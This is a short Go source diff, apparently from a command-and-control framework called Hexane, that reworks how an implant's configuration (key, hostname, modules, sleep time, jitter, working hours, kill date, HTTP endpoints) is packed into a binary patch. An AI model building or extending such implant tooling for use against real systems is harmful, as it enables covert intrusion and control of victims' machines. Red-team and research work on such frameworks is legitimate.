@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"path/filepath"
 	"runtime"
+	"strconv"
 )
 
 var ModuleStrings = []string{
@@ -214,26 +215,40 @@ func ReadConfig(cfgPath string) error {
 }
 
 func (h *HexaneConfig) CreateBinaryPatch() ([]byte, error) {
-	var err error
+	var (
+		err          error
+		workingHours int
+		killDate     int
+	)
 
 	stream := CreateStream()
-	implant := h.Implant
 
 	stream.PackByte(1) // Root
 	stream.PackBytes(h.Key)
+	stream.PackString(h.UserConfig.Config.Hostname)
 
 	for _, str := range h.UserConfig.Builder.LoadedModules {
 		stream.PackString(str)
 	}
-	stream.PackDword(h.PeerId)
-	stream.PackString(implant.Hostname)
-	stream.PackDword(implant.PeerId)
-	stream.PackDword(implant.Sleeptime)
-	stream.PackDword(implant.Jitter)
-	stream.PackInt32(implant.WorkingHours)
-	stream.PackDword64(implant.Killdate)
 
-	switch implant.ProfileTypeId {
+	if h.UserConfig.Config.WorkingHours != "" {
+		if workingHours, err = strconv.Atoi(h.UserConfig.Config.WorkingHours); err != nil {
+			return nil, err
+		}
+	}
+	if h.UserConfig.Config.Killdate != "" {
+		if killDate, err = strconv.Atoi(h.UserConfig.Config.Killdate); err != nil {
+			return nil, err
+		}
+	}
+
+	stream.PackDword(h.PeerId)
+	stream.PackDword(uint32(h.UserConfig.Config.Sleeptime))
+	stream.PackDword(uint32(h.UserConfig.Config.Jitter))
+	stream.PackInt32(int32(workingHours))
+	stream.PackDword64(int64(killDate))
+
+	switch h.Implant.ProfileTypeId {
 	case TRANSPORT_HTTP:
 		{
 			var httpConfig Http
@@ -247,7 +262,7 @@ func (h *HexaneConfig) CreateBinaryPatch() ([]byte, error) {
 			stream.PackDword(uint32(len(httpConfig.Endpoints)))
 
 			// endpoints always need specified
-			// todo: add random endpoints when not specified. use seclists or smth.
+			// todo: add random endpoints when not specified. use seclists.
 
 			for _, uri := range httpConfig.Endpoints {
 				stream.PackWString(uri)
